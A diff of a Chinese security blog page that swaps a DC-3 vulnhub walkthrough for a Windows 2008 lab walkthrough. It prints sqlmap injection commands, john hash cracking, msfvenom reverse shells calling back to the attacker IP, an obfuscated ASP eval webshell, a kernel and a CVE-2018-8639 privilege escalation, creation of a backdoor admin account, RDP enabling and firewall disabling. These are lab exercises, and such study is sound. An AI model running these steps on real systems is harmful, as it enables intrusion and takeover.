@@ -96,33 +96,28 @@
 
 
 
-  <meta name="description" content="前言难度中，涉及到Joomla! CMS、john">
-<meta name="keywords" content="渗透测试,提权,vulnhub">
+  <meta name="description" content="环境靶机：  IP:192.168.64.139 系统：windows 2008  攻击机：  IP:192.168.64.131 系统：kali   渗透信息收集nmap -A 192.168.64.139 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152">
+<meta name="keywords" content="渗透测试,提权,Windows">
 <meta property="og:type" content="article">
-<meta property="og:title" content="DC-3渗透实战">
-<meta property="og:url" content="https://songxpu.github.io/2019/08/16/DC-3/index.html">
+<meta property="og:title" content="windows2008渗透测试（一）">
+<meta property="og:url" content="https://songxpu.github.io/2019/08/16/windows2008_1/index.html">
 <meta property="og:site_name" content="Pines404">
-<meta property="og:description" content="前言难度中，涉及到Joomla! CMS、john">
+<meta property="og:description" content="环境靶机：  IP:192.168.64.139 系统：windows 2008  攻击机：  IP:192.168.64.131 系统：kali   渗透信息收集nmap -A 192.168.64.139 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="https://songxpu.github.io/2019/08/16/DC-3/1.png">
-<meta property="og:image" content="https://songxpu.github.io/2019/08/16/DC-3/2.png">
-<meta property="og:image" content="https://songxpu.github.io/2019/08/16/DC-3/3.jpg">
-<meta property="og:image" content="https://songxpu.github.io/2019/08/16/DC-3/4.png">
-<meta property="og:image" content="https://songxpu.github.io/2019/08/16/DC-3/sqlmap_1.png">
-<meta property="og:image" content="https://songxpu.github.io/2019/08/16/DC-3/sqlmap_2.png">
-<meta property="og:image" content="https://songxpu.github.io/2019/08/16/DC-3/sqlmap_3.png">
-<meta property="og:image" content="https://songxpu.github.io/2019/08/16/DC-3/5.png">
-<meta property="og:image" content="https://songxpu.github.io/2019/08/16/DC-3/6.png">
-<meta property="og:image" content="https://songxpu.github.io/2019/08/16/DC-3/7.png">
-<meta property="og:image" content="https://songxpu.github.io/2019/08/16/DC-3/8.png">
-<meta property="og:image" content="https://songxpu.github.io/2019/08/16/DC-3/9.png">
-<meta property="og:image" content="https://songxpu.github.io/2019/08/16/DC-3/exp.png">
-<meta property="og:image" content="https://songxpu.github.io/2019/08/16/DC-3/john.png">
-<meta property="og:updated_time" content="2019-08-16T04:02:18.601Z">
+<meta property="og:image" content="https://songxpu.github.io/2019/08/16/windows2008_1/webhome.png">
+<meta property="og:image" content="https://songxpu.github.io/2019/08/16/windows2008_1/whatweb.png">
+<meta property="og:image" content="https://songxpu.github.io/2019/08/16/windows2008_1/login.png">
+<meta property="og:image" content="https://songxpu.github.io/2019/08/16/windows2008_1/sql.png">
+<meta property="og:image" content="https://songxpu.github.io/2019/08/16/windows2008_1/webshell.png">
+<meta property="og:image" content="https://songxpu.github.io/2019/08/16/windows2008_1/meterpreter.png">
+<meta property="og:image" content="https://songxpu.github.io/2019/08/16/windows2008_1/metercmd.png">
+<meta property="og:image" content="https://songxpu.github.io/2019/08/16/windows2008_1/exp.png">
+<meta property="og:image" content="https://songxpu.github.io/2019/08/16/windows2008_1/exp2.png">
+<meta property="og:updated_time" content="2019-08-16T10:03:52.895Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="DC-3渗透实战">
-<meta name="twitter:description" content="前言难度中，涉及到Joomla! CMS、john">
-<meta name="twitter:image" content="https://songxpu.github.io/2019/08/16/DC-3/1.png">
+<meta name="twitter:title" content="windows2008渗透测试（一）">
+<meta name="twitter:description" content="环境靶机：  IP:192.168.64.139 系统：windows 2008  攻击机：  IP:192.168.64.131 系统：kali   渗透信息收集nmap -A 192.168.64.139 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152">
+<meta name="twitter:image" content="https://songxpu.github.io/2019/08/16/windows2008_1/webhome.png">
 
 
 
@@ -130,7 +125,7 @@
 
   
   
-  <link rel="canonical" href="https://songxpu.github.io/2019/08/16/DC-3/">
+  <link rel="canonical" href="https://songxpu.github.io/2019/08/16/windows2008_1/">
 
 
 
@@ -140,7 +135,7 @@
   };
 </script>
 
-  <title>DC-3渗透实战 | Pines404</title>
+  <title>windows2008渗透测试（一） | Pines404</title>
   
 
 
@@ -399,7 +394,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://songxpu.github.io/2019/08/16/DC-3/">
+    <link itemprop="mainEntityOfPage" href="https://songxpu.github.io/2019/08/16/windows2008_1/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Azeroth">
@@ -416,7 +411,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">DC-3渗透实战
+          <h1 class="post-title" itemprop="name headline">windows2008渗透测试（一）
 
               
             
@@ -442,7 +437,7 @@
                 
               
 
-              <time title="创建时间：2019-08-16 11:59:23 / 修改时间：12:02:18" itemprop="dateCreated datePublished" datetime="2019-08-16T11:59:23+08:00">2019-08-16</time>
+              <time title="创建时间：2019-08-16 17:43:59 / 修改时间：18:03:52" itemprop="dateCreated datePublished" datetime="2019-08-16T17:43:59+08:00">2019-08-16</time>
             
 
             
@@ -500,7 +495,7 @@
                 
                   <span class="post-meta-item-text">本文字数：</span>
                 
-                <span title="本文字数">3k</span>
+                <span title="本文字数">5.2k</span>
               
 
               
@@ -514,7 +509,7 @@
                 
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
-                <span title="阅读时长">3 分钟</span>
+                <span title="阅读时长">5 分钟</span>
               
             </div>
           
@@ -534,109 +529,102 @@
       
 
       
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>难度中，涉及到Joomla! CMS、john</p>
-<a id="more"></a>
-
-<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p><code>netdiscover -r 192.168.64.0/24</code></p>
-<img src="//songxpu.github.io/2019/08/16/DC-3/1.png" width="700">
-
-<p><code>nmap -A 192.168.64.156</code></p>
-<img src="//songxpu.github.io/2019/08/16/DC-3/2.png" width="700">
-
-<p>目录扫描=&gt; <code>http://192.168.64.157/administrator/</code>，发现为Joomla! CMS</p>
-<p>使用<a href="https://github.com/rezasp/joomscan.git" target="_blank" rel="noopener">JoomScan</a>工具检测</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl joomscan.pl -u http://192.168.64.157/</span><br></pre></td></tr></table></figure>
-
-<img src="//songxpu.github.io/2019/08/16/DC-3/3.jpg" width="500" height>
-
-<h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">searchsploit joomla | grep 3.7  </span><br><span class="line">cat /usr/share/exploitdb/platforms/php/webapps/42033.txt</span><br></pre></td></tr></table></figure>
-
-<img src="//songxpu.github.io/2019/08/16/DC-3/4.png" width height>
-
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>#########################################payload########################################</span><br><span class="line">sqlmap -u "http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</span><br></pre></td></tr></table></figure>
-
-<img src="//songxpu.github.io/2019/08/16/DC-3/sqlmap_1.png" width="700" height>
-
-<p><strong>爆表</strong>：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u "http://192.168.64.157/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb --tables</span><br></pre></td></tr></table></figure>
-
-<img src="//songxpu.github.io/2019/08/16/DC-3/sqlmap_2.png" width height="400">
-
-<p><strong>爆字段</strong>：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u "http://192.168.64.157/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb -T "#__users" --columns</span><br></pre></td></tr></table></figure>
-
-<img src="//songxpu.github.io/2019/08/16/DC-3/sqlmap_3.png" width height>
-
-<p><strong>dump</strong>：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u "http://192.168.64.157/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb -T "#__users" --dump</span><br></pre></td></tr></table></figure>
-
-<p>账号：admin</p>
-<p>密码：$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu</p>
-<h3 id="hash破解"><a href="#hash破解" class="headerlink" title="hash破解"></a>hash破解</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim hash #写入密码</span><br><span class="line">john --wordlist=/usr/share/john/password.lst ./hash</span><br></pre></td></tr></table></figure>
-
-<img src="//songxpu.github.io/2019/08/16/DC-3/5.png" width="700">
-
-<h3 id="GETSHELL"><a href="#GETSHELL" class="headerlink" title="GETSHELL"></a>GETSHELL</h3><p>登录后台（U:admin、P:snoop）</p>
-<p>选取模板管理，编辑index.php文件</p>
-<img src="//songxpu.github.io/2019/08/16/DC-3/6.png" width="750">
-
-<img src="//songxpu.github.io/2019/08/16/DC-3/7.png" width="750">
-
-<h3 id="sf反弹shell"><a href="#sf反弹shell" class="headerlink" title="sf反弹shell"></a>sf反弹shell</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.64.131 LPORT=4444 -f raw &gt; shell.php</span><br><span class="line"><span class="meta">#</span>########################################################################################</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set PAYLOAD php/meterpreter_reverse_tcp</span><br><span class="line">set LHOST 192.168.88.128</span><br><span class="line">set LPORT 4444</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
-
-<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p><strong>查看系统信息</strong>：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/version</span><br><span class="line">uname -a</span><br><span class="line">lsb_release -a</span><br></pre></td></tr></table></figure>
-
-<img src="//songxpu.github.io/2019/08/16/DC-3/8.png" width="800">
-
-<p><strong>exp</strong>：</p>
+        <h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>靶机：</p>
 <blockquote>
-<p>搜寻提权exp要有耐心，很多exp是用不了的……</p>
+<p>IP:192.168.64.139</p>
+<p>系统：windows 2008</p>
 </blockquote>
-<img src="//songxpu.github.io/2019/08/16/DC-3/9.png" width="800">
-
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>将exp移动至/var/www/html/</span><br><span class="line">cp /usr/share/exploitdb/exploits/linux/local/39772.txt /var/www/html/39772.txt</span><br><span class="line"><span class="meta">#</span>kali开启Apache</span><br><span class="line">/etc/init.d/apache2 start</span><br><span class="line"><span class="meta">#</span>下载至本机</span><br><span class="line">wget http://192.168.64.131/39772.txt</span><br></pre></td></tr></table></figure>
-
-<p>根据txt文件中描述，获取到exp:</p>
-<img src="//songxpu.github.io/2019/08/16/DC-3/exp.png" width="700">
-
-<p>上传至服务器，执行：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">=&gt;./compile.sh</span><br><span class="line">=&gt;./doubleput</span><br><span class="line">starting writev</span><br><span class="line">woohoo, got pointer reuse</span><br><span class="line">writev returned successfully. if this worked, you'll have a root shell in &lt;=60 seconds.</span><br><span class="line">suid file detected, launching rootshell...</span><br><span class="line">we have root privs now...</span><br><span class="line">^?</span><br><span class="line">bash: line 1: $'\177': command not found</span><br><span class="line">=&gt;id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),33(www-data)</span><br></pre></td></tr></table></figure>
-
-<h2 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h2><blockquote>
-<p>渗透过程中了解到或复习到的小知识点，记录下面便于今后查阅</p>
+<p>攻击机：</p>
+<blockquote>
+<p>IP:192.168.64.131</p>
+<p>系统：kali </p>
 </blockquote>
-<h3 id="Ubuntu开启ssh"><a href="#Ubuntu开启ssh" class="headerlink" title="Ubuntu开启ssh"></a>Ubuntu开启ssh</h3><ul>
-<li>安装openssh<br><code>sudo apt-get install openssh-server</code></li>
-<li>查看ssh状态<br><code>ps -aux|grep ssh</code></li>
-<li>启动服务<br><code>service ssh start</code></li>
-</ul>
-<h3 id="Ubuntu用户管理-普通用户-gt-root"><a href="#Ubuntu用户管理-普通用户-gt-root" class="headerlink" title="Ubuntu用户管理(普通用户-&gt;root)"></a>Ubuntu用户管理(普通用户-&gt;root)</h3><ul>
-<li><p>创建用户 <code>useradd test</code></p>
-</li>
-<li><p>设置密码 <code>passwd test</code></p>
-</li>
-<li><p>修改/etc/passwd：<code>root权限下修改uid：0</code></p>
-</li>
-<li><p>用户加入sudo组：在/etc/sudoers文件里给该用户添加权限</p>
-</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>root权限设置</span><br><span class="line">chmod u+w /etc/sudoers</span><br><span class="line">vi /etc/sudoers </span><br><span class="line"><span class="meta">#</span>找到这行 root ALL=(ALL) ALL,在他下面添加xxx ALL=(ALL) ALL (这里的xxx是你的用户名)</span><br><span class="line">chmod u-w /etc/sudoers</span><br></pre></td></tr></table></figure>
+<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p><code>nmap -A 192.168.64.139</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-06 08:35 EDT</span><br><span class="line">Nmap scan report for 192.168.64.139</span><br><span class="line">Host is up (0.00041s latency).</span><br><span class="line">Not shown: 989 closed ports</span><br><span class="line">PORT      STATE SERVICE      VERSION</span><br><span class="line">80/tcp    open  http         Microsoft IIS httpd 7.5</span><br><span class="line">| http-cookie-flags: </span><br><span class="line">|   /: </span><br><span class="line">|     ASPSESSIONIDQSCTABQS: </span><br><span class="line">|_      httponly flag not set</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Microsoft-IIS/7.5</span><br><span class="line">|_http-title: \xC4\xCF\xB7\xBD\xCA\xFD\xBE\xDD\xC6\xF3\xD2\xB5\xCD\xF8\xD5\xBE\xB9\xDC\xC0\xED\xCF\xB5\xCD\xB3</span><br><span class="line">135/tcp   open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds Windows Server 2008 R2 Datacenter 7601 Service Pack 1 microsoft-ds</span><br><span class="line">| ssl-cert: Subject: commonName=WIN-1DT2786LMA0</span><br><span class="line">| Not valid before: 2019-06-02T11:44:10</span><br><span class="line">|_Not valid after:  2019-12-02T11:44:10</span><br><span class="line">|_ssl-date: 2019-06-06T12:36:55+00:00; +2s from scanner time.</span><br><span class="line">49152/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49153/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49154/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49155/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49156/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49157/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">MAC Address: 00:0C:29:96:7E:A1 (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Microsoft Windows 7|2008|8.1</span><br><span class="line">OS CPE: cpe:/o:microsoft:windows_7::- cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows_server_2008::sp1 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_8.1</span><br><span class="line">OS details: Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: -1h59m58s, deviation: 4h00m00s, median: 1s</span><br><span class="line">|_nbstat: NetBIOS name: WIN-1DT2786LMA0, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:0c:29:96:7e:a1 (VMware)</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows Server 2008 R2 Datacenter 7601 Service Pack 1 (Windows Server 2008 R2 Datacenter 6.1)</span><br><span class="line">|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1</span><br><span class="line">|   Computer name: WIN-1DT2786LMA0</span><br><span class="line">|   NetBIOS computer name: WIN-1DT2786LMA0\x00</span><br><span class="line">|   Workgroup: WORKGROUP\x00</span><br><span class="line">|_  System time: 2019-06-06T20:36:55+08:00</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2019-06-06 08:36:56</span><br><span class="line">|_  start_date: 2019-06-06 08:16:59</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.41 ms 192.168.64.139</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 77.67 seconds</span><br></pre></td></tr></table></figure>
 
-<h3 id="John破解Linux密码教程"><a href="#John破解Linux密码教程" class="headerlink" title="John破解Linux密码教程"></a>John破解Linux密码教程</h3><ul>
-<li>破解Linux下passwd、shadow中的密码</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>合并passwd和shadow</span><br><span class="line">unshadow /etc/passwd /etc/shadow &gt; shadow</span><br><span class="line"><span class="meta">#</span>使用密码字典进行爆破</span><br><span class="line">john --wordlist=/usr/share/john/password.lst --rules shadow</span><br><span class="line"><span class="meta">#</span>不使用密码字典爆破</span><br><span class="line">john shadow</span><br></pre></td></tr></table></figure>
+<p>445端口考虑是否存在ms17-010漏洞，此处使用</p>
+<p><code>nmap --script smb-vuln-ms17-010 192.168.64.139</code></p>
+<p>探测发现445端口不存在漏洞，该系统存在补丁，无法利用；</p>
+<p>80端口开启，存在http服务，考虑从web漏洞渗透</p>
+<img src="//songxpu.github.io/2019/08/16/windows2008_1/webhome.png" width="600">
 
-<img src="//songxpu.github.io/2019/08/16/DC-3/john.png" width="700">
+<h3 id="容器探测"><a href="#容器探测" class="headerlink" title="容器探测"></a>容器探测</h3><p><code>whatweb 192.168.64.139</code></p>
+<img src="//songxpu.github.io/2019/08/16/windows2008_1/whatweb.png" height>
 
-<ul>
-<li>注意</li>
-</ul>
-<p>john工具对于同一个shadow文件只会进行一次爆破，如果第二次执行john shadow是不会得到结果的</p>
-<p>因此，查看上一次爆破结果：<code>john --show shadow</code></p>
-<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://blog.csdn.net/funkypants/article/details/78648109" target="_blank" rel="noopener">使用john进行密码爆破</a></p>
-<p><a href="https://www.jianshu.com/p/146b0efd51a2" target="_blank" rel="noopener">DC-3渗透实战</a></p>
+<p>经过搜索，该网站后台路径暴露，但后台主页显示的账号密码均为错误信息。</p>
+<img src="//songxpu.github.io/2019/08/16/windows2008_1/login.png" width="700">
+
+<p>该网站系统为南方数据cms，从此从网络上搜索出<a href="http://www.vfocus.net/art/20110511/8986.html" target="_blank" rel="noopener">漏洞资料</a>，得到用户名及密码：</p>
+<blockquote>
+<p>username:admin</p>
+<p>password:roottoor</p>
+</blockquote>
+<h3 id="GETSHELL"><a href="#GETSHELL" class="headerlink" title="GETSHELL"></a>GETSHELL</h3><p>登录后台后有三种思路：</p>
+<ol>
+<li>上传文件</li>
+<li>网站配置中插入asp一句话</li>
+<li>数据库备份拿webshell</li>
+</ol>
+<p>经过验证，上传文件无法上传asp、aspx文件；网站配置插入一句话导致网站崩溃。</p>
+<p>因而这里采取数据库备份：</p>
+<p>首先将asp一句话木马的后缀修改位合法后缀名，例如：ok.png；</p>
+<p>完成后上传该文件，记录上传后的路径：<code>UploadFiles/20196621207602.png</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">Function MorfiCoder(Code)</span><br><span class="line">MorfiCoder=Replace(Replace(StrReverse(Code),&quot;/*/&quot;,&quot;&quot;&quot;&quot;),&quot;\*\&quot;,vbCrlf)</span><br><span class="line">End Function</span><br><span class="line">Execute MorfiCoder(&quot;)/*/z/*/(tseuqer lave&quot;)</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>打开<strong>系统管理</strong>-&gt;<strong>数据库备份</strong>，如图操作：</p>
+<blockquote>
+<p>原理：此处数据库备份将原文件覆盖重写，将ok.png修改为shell.asp</p>
+</blockquote>
+<img src="//songxpu.github.io/2019/08/16/windows2008_1/sql.png" width="700">
+
+<img src="//songxpu.github.io/2019/08/16/windows2008_1/webshell.png" width>
+
+<p>访问该文件，并连接蚁剑，发现权限为：<code>iis apppool\nfsj</code>，需要进一步<strong>提权</strong>。</p>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><ol>
+<li><p>利用msf生成后门程序，将该程序上传至服务器上</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.64.121 lport=8888 -f exe &gt; /root/Desktop/load.exe</span><br><span class="line"></span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.64.121</span><br><span class="line">set port 8888</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>完成后在蚁剑虚拟终端中执行该文件，在msf中会接收到会话，自动进入meterpreter</p>
+<blockquote>
+<p>【需要使用的几个命令】</p>
+<p>sessions:查看接收到的session</p>
+<p>session -i [id]:进入到指定id的session中</p>
+<p>background:后台挂起该会话</p>
+<p>execute -f cmd.exe -:调用目标系统的cmd</p>
+<p>getsystem:使用默认一些方法提（不一定成功）</p>
+</blockquote>
+<img src="//songxpu.github.io/2019/08/16/windows2008_1/meterpreter.png" width>
+
+</li>
+</ol>
+<hr>
+<img src="//songxpu.github.io/2019/08/16/windows2008_1/metercmd.png" width=" ">
+
+<p>上传提权EXP:<a href="https://github.com/ze0r/CVE-2018-8639-exp" target="_blank" rel="noopener">CVE-2018-8639</a>，并在cmd中执行该exp(webshell中没有回显)</p>
+<p>注意，该exp<strong>极不稳定</strong>，运行后显示以下信息，表示已经开始运行</p>
+<img src="//songxpu.github.io/2019/08/16/windows2008_1/exp.png" width="600">
+
+<p>执行过程中不断whoami查看权限变化：</p>
+<img src="//songxpu.github.io/2019/08/16/windows2008_1/exp2.png" width>
+
+<p>取得系统权限后，创建账号并加入管理员组</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user admin abc123ABC /ad</span><br><span class="line">net localgroup administrators admin /add</span><br></pre></td></tr></table></figure>
+
+<p>成功后发现3389端口并未开启，这里采取以下办法开启3389——<a href="https://www.je2se.com/archives/72" target="_blank" rel="noopener">参考文章</a></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">echo Windows Registry Editor Version 5.00 &gt;3389.reg</span><br><span class="line">echo. &gt;&gt;3389.reg</span><br><span class="line">echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server] &gt;&gt;3389.reg</span><br><span class="line">echo "fDenyTSConnections"=dword:00000000 &gt;&gt;3389.reg</span><br><span class="line">echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp] &gt;&gt;3389.reg</span><br><span class="line">echo "PortNumber"=dword:00000d3d &gt;&gt;3389.reg</span><br><span class="line">echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp] &gt;&gt;3389.reg</span><br><span class="line">echo "PortNumber"=dword:00000d3d &gt;&gt;3389.reg</span><br></pre></td></tr></table></figure>
+
+<p>再在<strong>提权状态</strong>下，cmd中输入：<code>regedit /s 3389.reg</code>  执行</p>
+<p>【这个exp运行初期考人品，但是后期会发现存在规律~在卡顿的那空白一行中输入不会出现错误】</p>
+<p>关闭防火墙：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall set opmode mode=disable</span><br></pre></td></tr></table></figure>
+
+<p>然后3389开启，远程登录即可~</p>
+<p>kali远程协助：<code>rdesktop -u admin -p abc123ABC -g 1024*720 192.168.64.139</code></p>
+<p>Windows远程协助：<code>mstsc</code></p>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ol>
+<li><a href="http://www.myh0st.cn/index.php/archives/67/" target="_blank" rel="noopener">msf生成常用payload</a></li>
+<li><a href="https://xz.aliyun.com/t/2380#toc-4" target="_blank" rel="noopener">正向与反向反弹shell</a></li>
+</ol>
 
       
     </div>
@@ -667,7 +655,7 @@
           
             <a href="/tags/提权/" rel="tag"># 提权</a>
           
-            <a href="/tags/vulnhub/" rel="tag"># vulnhub</a>
+            <a href="/tags/Windows/" rel="tag"># Windows</a>
           
         </div>
       
@@ -680,8 +668,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/08/10/LazySysAdmin/" rel="next" title="LazySysAdmin渗透实战">
